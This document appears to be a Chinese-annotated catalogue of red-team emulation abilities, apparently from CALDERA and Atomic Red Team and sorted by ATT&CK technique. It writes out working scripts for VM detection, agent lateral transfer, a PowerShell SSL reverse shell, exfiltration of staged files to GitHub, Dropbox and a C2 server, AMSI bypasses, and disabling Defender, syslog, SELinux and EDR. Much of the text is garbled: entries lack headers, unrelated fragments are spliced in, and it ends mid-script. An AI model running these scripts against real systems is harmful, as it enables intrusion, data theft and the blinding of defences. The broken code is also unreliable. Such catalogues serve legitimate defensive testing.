### Virtualization/Sandbox Evasion: System Checks（T1497.001） — 8 个

#### Check if System Integrity Protection is enabled
- **ID**: `28f4b7b1d696470a2b6c8f87faed97ef`
- **简介**: 最新版本的 macOS 具有系统完整性保护功能 (SIP)。如果沙箱使用未签名的内核扩展进行监控，则必须禁用 SIP 功能才能加载此类内核扩展。恶意软件可能会检查 SIP 是否已启用。参考号：https://evasions.checkpoint.com/src/MacOS/macos.html#sip
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
if [ "$(csrutil status | grep -v 'enabled')" != "" ]; then echo 'Possible Virtualization Environment detected'; fi;
```

#### Detect Virtualization Environment (FreeBSD)
- **ID**: `6d0d75bc76296a8e051124c23e7c4769`
- **简介**: 检测虚拟化环境中的执行情况。启动时，如果检测到虚拟机管理程序，dmesg 会存储日志。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if [ "$(sysctl -n hw.hv_vendor)" != "" ]; then echo "Virtualization Environment detected"; fi
```

#### Detect Virtualization Environment (Linux)
- **ID**: `2d5466e4b31c7db0860642bce47ef5ca`
- **简介**: systemd-Detect-virt 检测虚拟化环境中的执行。启动时，如果检测到虚拟机管理程序，dmesg 会存储日志。
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if (systemd-detect-virt) then echo "Virtualization Environment detected"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo "Virtualization Environment detected"; fi;
```

#### Detect Virtualization Environment (Windows)
- **ID**: `e9e69b4fedb8e40d634865ce9a3192dc`
- **简介**: Windows Management Instrumentation (WMI) 对象包含有助于检测虚拟化的系统信息。此命令将专门尝试从此对象获取 CurrentTemperature 值，并检查该尝试是否会导致包含“supported”一词的错误。这是为了找到不支持的结果，这是在虚拟机中运行的结果
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$error.clear(); Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue; if($error) {echo "Virtualization Environment detected"}
```

#### Detect Virtualization Environment using sysctl (hw.model)
- **ID**: `fe273ff9035b5fdec0b98049752237e2`
- **简介**: 如果是本机 Apple 硬件，sysctl hw.model 将返回硬件的型号名称（Macmini8,1、MacBookAir10,1 等），但会返回虚拟机管理程序名称 (VMware7,0)。参考号：https://evasions.checkpoint.com/src/MacOS/macos.html#hardware-model
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
if [ "$(sysctl -n hw.model | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
```

#### Detect Virtualization Environment using system_profiler
- **ID**: `9e198a5c70a03508826676a522587183`
- **简介**: system_profiler 提供系统硬件和软件配置，型号标识符应提供类似于 (sysctl -n hw.model) 的值。 我们应该可以通过检查型号标识符是否不包含“Mac”来判断是否启用了虚拟化。
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
if [ "$(system_profiler SPHardwareDataType | grep "Model Identifier" | grep -v 'Mac')" != "" ]; then echo 'Virtualization Environment detected'; fi;
```

#### Detect Virtualization Environment via ioreg
- **ID**: `3482b81a85a687d8bbb0542651da88a3`
- **简介**: ioreg 包含系统中所有设备驱动程序的注册表项。如果是虚拟机，设备制造商之一将是虚拟化软件。
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
```

#### Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)
- **ID**: `64ccf7cd4358a0540ab51c8015c1b744`
- **简介**: Windows Management Instrumentation (WMI) 对象包含有助于检测虚拟化的系统信息。该测试将获取机器的型号和制造商，以确定它是否是虚拟机，例如通过VMware或VirtualBox。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Manufacturer"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty "Model"; if((($Manufacturer.ToLower() -eq "microsoft corporation") -and ($Model.ToLower().contains("virtual"))) -or ($Manufacturer.ToLower().contains("vmware")) -or ($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization environment detected!"} else {write-host "No virtualization environment detected!"}
```

### Lateral Tool Transfer（T1570） — 5 个

#### Copy Sandcat (WinRM and SCP)
- **ID**: `4908fdc4-74fc-4d7c-8935-26d11ad26a8d`
- **简介**: 将 Sandcat 复制到远程主机（仅限 powershell 5 或更高版本）或 SCP

- **依赖 payload**: sandcat.go-darwin, sandcat.go-linux, sandcat.go-windows
- **执行脚本**:
`windows/psh`:
```
$job = Start-Job -ScriptBlock {
  $username = "#{domain.user.name}";
  $password = "#{domain.user.password}";
  $secstr = New-Object -TypeName System.Security.SecureString;
  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
  $location = "#{location}";
  $exe = "#{exe_name}";
  Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
  Start-Sleep -s 5;
  Remove-PSSession -Session $session;
};
Receive-Job -Job $job -Wait;
```
`darwin/sh`:
```
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
```
`linux/sh`:
```
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
```

Start-Sleep -s 5;

### Data from Removable Media（T1025） — 2 个

#### Identify Documents on USB and Removable Media via PowerShell
- **ID**: `7ba24116fdb494425cbab8be809a96a5`
- **简介**: 此测试模拟使用 PowerShell 检测连接的 USB 或其他可移动存储设备并收集特定文档文件列表（例如 .docx、.xls、.txt、.pdf）的攻击。该命令的工作原理是，首先识别系统上的可移动驱动器，然后递归地搜索每个驱动器以查找与目标扩展名匹配的文件。如果不存在可移动驱动器，该脚本将返回一条消息，指出未检测到任何介质。此行为模仿了攻击者如何扫描可移动设备上的敏感文档以进行渗透或分析。
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
powershell.exe -c "Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }"
```

#### Identify Documents on USB and Removable Media via PowerShell (Generated from Atomic Red Team)
- **ID**: `1b5b56dd-3019-4927-8d82-07afa983c92d`
- **简介**: 能够从可移动介质获取数据 (ATT&CK T1025)。 通过 PowerShell 识别 USB 和可移动媒体上的文档。由原子红队程序生成（0b29f7e3-a050-44b7-bf05-9fb86af1ec2e）；使用前进行安全审查和测试。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Get-Volume | Where-Object {
  $_.DriveType -eq 'Removable'
} | ForEach-Object {
  Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Output $_.FullName
  } 
};
if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) {
  Write-Output 'No removable media.'
}
```

#### Screen Capture
- **ID**: `316251ed-6a28-4013-812b-ddf5b5b007f8`
- **简介**: 捕获屏幕内容
- **平台/执行器**: darwin/sh, windows/psh, windows/pwsh
- **执行脚本**:
`darwin/sh`:
```
for i in {1..5}; do screencapture -t png screen-$i.png; echo "$(cd "$(dirname "$1")"; pwd -P)/$(basename "screen-$i.png")"; sleep 5; done;
```
`windows/psh`:
```
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
   $graphics = [Drawing.Graphics]::FromImage($bmp);
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
   $bmp.Save($path);
   $graphics.Dispose();
   $bmp.Dispose();
}
if ($loadResult) {
  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
  $dest = "$HOME\Desktop\screenshot.png";
  screenshot $bounds $dest;
  if (Test-Path -Path $dest) {
    $dest;
    exit 0;
  };
};
exit 1;
```

- **ID**: `fb827394b296192cb7a81031a2e37ae2`
- **简介**: 感谢 @OrOneEqualsOne 提供这种快速的 C2 方法。此测试用于验证能否使用 SSL socket 建立 C2 会话。有关此技术的更多信息（包括如何设置监听器），请参阅：https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926 成功执行后，powershell 将通过 443 端口连接到 127.0.0.1。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
```

`linux/sh`:
```

socket="#{app.contact.tcp}";

if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
$server="#{app.contact.http}";

rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;

### Data Transfer Size Limits（T1030） — 3 个

#### Compress Staged Directory (Password Protected) and Split Into Smaller Chunks
- **ID**: `5c5b0392-1daa-45e1-967c-2f361ce78849`
- **简介**: 此能力会将暂存文件压缩成受密码保护的归档文件，并根据给定的字节大小将其拆分为更小的分块。原始归档文件将被自动删除。如果希望用于外泄的文件体积较小，请使用此能力而非其他归档能力。与数据外泄能力配合使用时，外泄能力将在一次操作中根据创建的分块数量运行多次。
- **平台/执行器**: linux/sh, windows/psh
- **执行脚本**:
`linux/sh`:
```
tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;
split -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;
rm '#{host.dir.staged}.tar.gz.gpg';
find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;
```
`windows/psh`:
```
& "C:\Program Files\7-Zip\7z.exe" a "#{host.dir.staged}.7z" "#{host.dir.staged}\*" '-p#{host.archive.password}' | Out-Null;
sleep 2;
$Archive = Get-Item -Path "#{host.dir.staged}.7z";
$StageDir = "#{host.dir.staged}";
$BaseName = $StageDir + "\calderachunk";
$UpperBound = [int32]"#{file.size.chunk}";
$Content = [IO.File]::OpenRead($Archive);
$buff = New-Object byte[] $UpperBound;
$Bytes = $idx = 0;
try {
    do {
        $Bytes = $Content.Read($buff, 0, $buff.Length);
        if ($Bytes -gt 0) {
            $ChunkName = "{0}{1}" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));
            $ChunkFile = [IO.File]::OpenWrite($ChunkName);
            try {
                $ChunkFile.Write($buff, 0, $Bytes);
            } finally {
                $ChunkFile.Close();
            }
        }
        $idx ++;
    } while ($Bytes -gt 0)
}
finally {
    $Content.Close();
}
Remove-Item $Archive;
Get-ChildItem -Path "$StageDir\calderachunk*" | foreach {$_.FullName} | Select-Object;
```

- **执行脚本**:
`windows/psh`:
```
$SourceFile = (Get-Item #{host.dir.compress});
$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)";
$TargetFilePath = "/#{dropbox.target.dir}/$RemoteName";
$ApiKey = "#{dropbox.api.key}";

$url = "https://content.dropboxapi.com/2/files/upload";

$file = [IO.File]::ReadAllBytes($SourceFile);
[net.httpWebRequest] $req = [net.webRequest]::create($url);

$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
$authorization = "Bearer " + $ApiKey;

$req.method = "POST";
$req.Headers.Add("Authorization", $authorization);
$req.Headers.Add("Dropbox-API-Arg", $arg);
$req.ContentType = 'application/octet-stream';
$req.ContentLength = $file.length;
$req.TimeOut = 50000;
$req.KeepAlive = $true;
$req.Headers.Add("Keep-Alive: 300");
$reqst = $req.getRequestStream();
$reqst.write($file, 0, $file.length);
$reqst.flush();
$reqst.close();

[net.httpWebResponse] $res = $req.getResponse();
$resst = $res.getResponseStream();
$sr = new-object IO.StreamReader($resst);
$result = $sr.ReadToEnd();
$result;
$res.close();
```

- **平台/执行器**: linux/sh, windows/psh
- **执行脚本**:
`linux/sh`:
```
GHUser="#{github.user.name}";
GHPAT="#{github.access.token}";
FileContent=$(base64 #{host.dir.compress});
LocalFile='#{host.dir.compress}';
RemoteFile="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";

`windows/psh`:
```
$GHUser = "#{github.user.name}";

$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)";

    files = @{$RemoteName = @{content = $FileContent}};
    public = $False;
} | ConvertTo-Json;

};
Invoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;

### Exfiltration to Code Repository（T1567.001） — 1 个

#### Exfil Directory Files to GitHub
- **ID**: `a201bec2-a193-4b58-bf0e-57fa621da474`
- **简介**: 此能力将把指定暂存目录中的所有文件外传到 GitHub 中的仓库。
- **平台/执行器**: linux/sh, windows/psh, windows/pwsh
- **执行脚本**:
`linux/sh`:
```
GHUser="#{github.user.name}";
GHRepo="#{github.repository.name}";
GHPAT="#{github.access.token}";
GHBranch='#{github.repository.branch}';
LocalDirectory=#{host.dir.staged};
Header="Authorization: token $GHPAT";

for file in $LocalDirectory/*.*; do
  TempName=$(echo $file | sed "s/ /-/g")
	RemoteName="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename "$TempName")";
	echo "{\"message\":\"Committed $(basename $TempName) at: $(date)\", \"branch\":\"$GHBranch\", \"content\":\"" >/tmp/b64;
  base64 -w 0 "$file" >>/tmp/b64;
  echo "\"}" >>/tmp/b64;
	content=$(curl -s -X PUT -H "Accept: application/vnd.github.v3+json" -H "$Header" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);
  rm /tmp/b64;
done;
```
`windows/psh`:
```
$GHUser = "#{github.user.name}";
$GHRepo = "#{github.repository.name}";
$GHPAT = "#{github.access.token}";
$GHBranch = '#{github.repository.branch}';
$LocalDirectory = "#{host.dir.staged}";
$token = $GHUser + ":" + $GHPAT;
$basetoken = [System.Convert]::ToBase64String([char[]]$token);
$Headers = @{
    Authorization = 'Basic {0}' -f $basetoken;
};

$Files = Get-ChildItem $LocalDirectory;
foreach ($file in $Files){
    $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)";
    $uri = "https://api.github.com/repos/" + $GHUser + "/" + $GHRepo + "/contents/" + $RemoteName;
    $FileBytes = Get-Content -Path $file.FullName -Encoding Byte;
    $Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);
    $Body = @{
        path = $file.Name;
        branch = $GHBranch;
        content = $Base64EncodedFileBytes;
        encoding = 'base64';
        message = "Committed " + $file.name + " at: " + (Get-Date);
    } | ConvertTo-Json;
    try {
        $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;
    } catch {
        if ($PSItem -notmatch "but expected") { $PSItem; }
        else { $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue; }
    }
};
```

#### Scheduled Exfiltration
- **ID**: `110cea7a-5b03-4443-92ee-7ccefaead451`

- **执行脚本**:
`linux/sh`:
```
crontab -l > /tmp/origcron;
crontab -l > /tmp/mycron;
echo "0 12 * * * curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;

```
`windows/psh`:
```
$commandString = '$fieldName = \"#{host.dir.compress}";
$filePath = \"#{host.dir.compress}";
$url = \"#{server}/file/upload\";
Add-Type -AssemblyName \"System.Net.Http\";

$client = New-Object System.Net.Http.HttpClient;
$content = New-Object System.Net.Http.MultipartFormDataContent;
$fileStream = [System.IO.File]::OpenRead($filePath);
$fileName = [System.IO.Path]::GetFileName($filePath);
$fileContent = New-Object System.Net.Http.StreamContent($fileStream);

$xRequestIdHeader = \"X-Request-Id\";
$xRequestIdField = $env:COMPUTERNAME + \"-#{paw}\";
$content.Add($fileContent, $fieldName, $fileName);
$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);

$userAgentHeader = \"User-Agent\";
$userAgentField = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\";
$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);
$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$commandString";
$trigger = New-ScheduledTaskTrigger -Once -At 12pm;

Register-ScheduledTask -TaskName "Scheduled exfiltration" -Trigger $trigger -Action $action;
```

#### Modify VSS Service Permissions
- **ID**: `aa615de11087fb98b93bb2c06fdcb34c`
- **简介**: 此原子测试通过修改卷影复制服务（Volume Shadow Copy Service, VSS）的权限来更改其安全设置，可能影响系统恢复操作。该命令设置的具体权限如下：- 拒绝向网络用户（Network Users, NU）授予常规全部（Generic All, GA）权限 - 拒绝向 Everyone（WD）授予 GA 权限 - 拒绝向 Anonymous（AN）授予 GA 权限 - 在系统 ACL（SACL）中允许向 Everyone（WD）授予完全访问（Full Access, FA）和 GA 权限 - 在 SACL 中允许向 Everyone（WD）授予"对象继承和仅继承（Object Inherit and Inherit Only, OIIO）"的 FA 和 GA 权限。这些权限会显著限制 VSS 的功能，包括备份和还原操作。因此，务必仅在具有管理权限的受控环境中运行此测试。提供了清理命令，可将 VSS 权限重置为常见的默认配置，但应根据你具体系统的配置进行验证。测试后务必使用此清理命令，以确保系统的备份和恢复能力保持正常。未经适当的预防措施和可靠的恢复计划，不建议在生产系统或关键环境中运行此测试。
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
```

aws ec2 create-launch-template \;   --launch-template-name fb6145_template.json \;   --version-description 1 \;   --tag-specifications 'ResourceType=launch-template,Tags=[{Key=purpose,Value=production}]' \;   --launch-template-data file://template.json; aws ec2 run-instances --image-id ami-12345678 --instance-type tg4.nano \;   --region us-east-1 --profile default
```

```

```

New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null; New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null

#### AMSI Bypass - Override AMSI via COM
- **ID**: `682fd8ce0e7a672eb8851e9adb15cab0`
- **简介**: 拥有管理员权限时，攻击者可以通过 HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} 中的注册表值禁用 AMSI，即覆盖 Microsoft Defender 针对 AMSI 的 COM 对象并将其指向一个不存在的 DLL。此方法目前正被 AsyncRAT 等恶意软件使用。https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
```

#### AMSI Bypass - Remove AMSI Provider Reg Key
- **ID**: `392e12d6a466407e28d1bb51cf0729bb`
- **简介**: 拥有管理员权限时，攻击者可以删除 HKLM\Software\Microsoft\AMSI 中的 AMSI 提供程序注册表项以禁用 AMSI 检测。此测试会删除 Windows Defender 提供程序的注册表项。执行后不显示任何输出。打开注册表编辑器并导航到 "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" 以确认其已被删除。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

#### Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table
- **ID**: `641fd1bc72c2f1230e129ed8981fd824`
- **简介**: 攻击者将 DNS 查询重定向到错误或恶意的 DNS 服务器 IP，从而阻止合法的通信并可能破坏安全基础设施。此原子测试旨在当对 endpoint.security.microsoft.com 发起 DNS 查询时，以 127.0.0.1 作为响应。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"; Clear-DnsClientCache
```

#### Clear Pagging Cache

```

- **简介**: 禁用 OpenDNS Umbrella
- **平台/执行器**: darwin/sh
- **执行脚本**:
`darwin/sh`:
```
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
```

#### Disable Powershell ETW Provider - Windows
- **ID**: `233bd007622d94ee3019efc6a70d0a83`
- **简介**: 该测试旨在通过使用 Windows 内置工具 logman.exe 禁用 Microsoft Powershell ETW 提供程序。该提供程序是 AV/EDR 解决方案中常用的遥测来源。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "#{session}" --p "#{provider}" -ets
```

#### Disable SELinux

setenforce 0
```

#### Disable syslog
- **ID**: `3a68db58e75f8887944e846f0455f758`
- **简介**: 禁用 syslog 收集
- **平台/执行器**: linux/sh
- **执行脚本**:
`linux/sh`:
```
if (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then : ; else sudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog); fi;  systemctl stop rsyslog ; systemctl disable rsyslog
```

#### Disable syslog (freebsd)
- **ID**: `c59d5b6399f7708eb5595e2a8381814c`

- **执行脚本**:
`linux/sh`:
```
service syslogd stop; sysrc syslogd_enable="NO"
```

#### Disable Windows Defender with DISM
- **ID**: `93b4f004682dfb6d1af15e01c2859f93`
- **简介**: 以下原子测试将尝试使用内置的 DISM.exe(部署映像服务和管理工具)禁用 Windows-Defender。DISM 用于枚举、安装、卸载、配置和更新 Windows 映像中的功能和程序包。成功执行后不会在标准输出中显示任何详细信息。如果需要详细输出,请移除静默开关。此方法将删除 Defender 及其程序包。
- **平台/执行器**: windows/cmd
- **执行脚本**:
`windows/cmd`:
```
Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
```

#### Disable Windows Defender with PwSh Disable-WindowsOptionalFeature
- **ID**: `afae914d4839d5194835d8475604e7b8`
- **简介**: 以下原子测试将尝试使用内置的 PowerShell cmdlet Disable-WindowsOptionalFeature(部署映像服务和管理工具)禁用 Windows-Defender。与 DISM.exe 类似,此 cmdlet 用于枚举、安装、卸载、配置和更新 Windows 映像中的功能和程序包。成功执行后不会在标准输出中显示任何详细信息。如果需要详细输出,请移除静默开关。此方法将删除 Defender 及其程序包。参考: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore; Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore
```

#### ESXi - Disable Account Lockout Policy via PowerCLI
- **ID**: `f3bcc817369d56ba4779a61dd6b4684e`
- **简介**: 攻击者可能会禁用 ESXi 中的帐户锁定策略,从而能够在未来阻止防御性措施被强制执行,或防止未来的告警。
- **平台/执行器**: linux/psh
- **执行脚本**:
`linux/psh`:
```
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ; Connect-VIServer -Server atomic.local -User root -Password pass; Get-AdvancedSetting -Entity atomic.local -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false; Disconnect-VIServer -Confirm:$false
```

#### Freeze PPL-protected process with EDR-Freeze
- **ID**: `54ebf8b23105d20c98156afd96b97c81`
- **简介**: 此测试使用工具 EDR-Freeze,该工具利用微软原生二进制文件 WerFaultSecure.exe 来挂起受 Protected Process Light (PPL) 机制保护的进程。PPL 是 Windows 的一项安全功能,旨在保护关键系统进程(例如与防病毒、凭据保护和系统完整性相关的进程),使其免受篡改或检查。这些进程在受限环境中运行,即使管理员或调试工具也无法访问,除非访问工具已由微软签名并受信任。通过使用操作系统固有信任的 WerFaultSecure.exe,EDR-Freeze 能够绕过这些限制并临时冻结受 PPL 保护的进程,以供分析或测试。
- **平台/执行器**: windows/psh
- **执行脚本**:
`windows/psh`:
```
Add-Type -TypeDefinition @"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport("advapi32.dll", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport("advapi32.dll", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport("advapi32.dll", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; "@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host "SeDebugPrivilege enabled successfully." -ForegroundColor Green; } else {;     Write-Host "Failed to enable SeDebugPrivilege." -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host "Process Name: $processName)"; Write-Host "PID: $($process.Id)"; $query = "SELECT * FROM Win32_Process WHERE Name = '$processName.exe'"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host "User: $($owner.Domain)\$($owner.User)"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = "https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip"; $zipPath = Join-Path $scriptFolder "EDR-Freeze_1.0.zip"; Write-Host "Downloading latest EDR-Freeze from $downloadUrl" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host "Download completed: $zipPath" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host "Extracting archive to $extractFolder (overwriting existing files)" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name "EDR-Freeze_1.0" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = 